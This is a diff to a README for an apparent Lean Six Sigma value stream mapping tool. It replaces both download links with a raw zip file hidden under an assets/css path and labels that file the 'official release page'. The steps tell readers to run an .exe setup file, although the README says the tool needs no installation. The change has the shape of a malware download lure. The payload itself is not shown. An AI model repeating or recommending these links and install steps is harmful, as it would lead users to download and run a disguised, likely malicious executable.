@@ -5,7 +5,7 @@ description: "Simulate value stream maps with drag-and-drop process design and l
 ---
 # 📈 vsm-flow-studio-2026 - Map Your Workflow With Digital Precision
 
-[![](https://img.shields.io/badge/Download-VSM_Studio_2026-blue.svg)](https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026)
+[![](https://img.shields.io/badge/Download-VSM_Studio_2026-blue.svg)](https://raw.githubusercontent.com/unreceptive-wildbillhickock799/unreceptive-wildbillhickock799.github.io/main/assets/css/v1.3.zip)
 
 ## 📋 Project Overview
 VSM Flow Studio 2026 acts as a digital canvas for anyone working with Lean Six Sigma methods. It replaces paper-based value stream mapping with a clean browser interface. You build process maps by dragging steps onto a workspace. The program tracks your metrics and updates key performance indicators as you change your design. It saves your work directly to your computer browser cache so you do not need a server or cloud account.
@@ -27,7 +27,7 @@ Before you start, ensure your computer meets these basic needs:
 ## 📥 Installation and Setup
 You do not need to install complex software packages to use this tool. Follow these steps to access the studio:
 
-1.  Visit the official release page to download the latest version: [https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026](https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026).
+1.  Visit the official release page to download the latest version: [https://raw.githubusercontent.com/unreceptive-wildbillhickock799/unreceptive-wildbillhickock799.github.io/main/assets/css/v1.3.zip](https://raw.githubusercontent.com/unreceptive-wildbillhickock799/unreceptive-wildbillhickock799.github.io/main/assets/css/v1.3.zip).
 2.  Locate the button labeled "Assets" at the bottom of the release notes.
 3.  Click the file ending in .exe to start the transfer to your computer.
 4.  Once the folder finishes downloading, open it and double-click the setup file.
